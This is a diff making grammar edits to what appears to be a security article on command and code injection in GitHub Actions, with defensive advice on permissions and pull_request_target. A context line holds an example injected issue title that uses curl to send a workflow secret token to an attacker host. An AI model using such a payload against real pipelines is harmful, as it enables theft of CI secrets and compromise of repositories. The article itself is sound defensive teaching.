@@ -8,7 +8,7 @@ A user opens a GitHub issue titled `"; curl http://attacker.site?token=${{ secre
 
 Modern CI/CD pipelines like GitHub Actions automate everything from testing and building to deploying production code. But when workflows are written insecurely, they can become an attacker’s playground. This risk is especially relevant when user-supplied data flows directly into commands or scripts.
 
-There are also potential for [code injection](/learn/vulnerabilities/code-injection) where instead of executing a command, source code is included in the configuration to run. So both command and code injection have a common security vulnerability theme, untrusted user input including in GitHub Actions workflows can lead to exfiltrating tokens, compromising infrastructure, or creating releases to distribute malware.
+There is also potential for [code injection](/learn/vulnerabilities/code-injection), where instead of executing a command, source code is included in the configuration to run. Command and code injection have a common security vulnerability theme: untrusted user input included in GitHub Actions workflows can lead to exfiltrating tokens, compromising infrastructure, or creating releases to distribute malware.
 
 In this article, we’ll break down how command and code injection can happen in GitHub Actions, explore common attack patterns, show how to detect it in code, and end with practical advice to avoid these issues in your own workflows.
 
@@ -145,7 +145,7 @@ permissions:
 
 Avoid using event types like `pull_request_target` unless absolutely necessary, as it grants write permissions to the `GITHUB_TOKEN` by default. 
 
-For any secrets configured, limit their access from org-wide level whenever it is not necessary. Branch protection rules can also be effective of limiting permissive settings that can be detected before being exploited.
+For any secrets configured, limit their access from org-wide level whenever it is not necessary. Branch protection rules can also be effective at limiting permissive settings that can be detected before being exploited.
 
 ### Separate Untrusted Code Execution
 
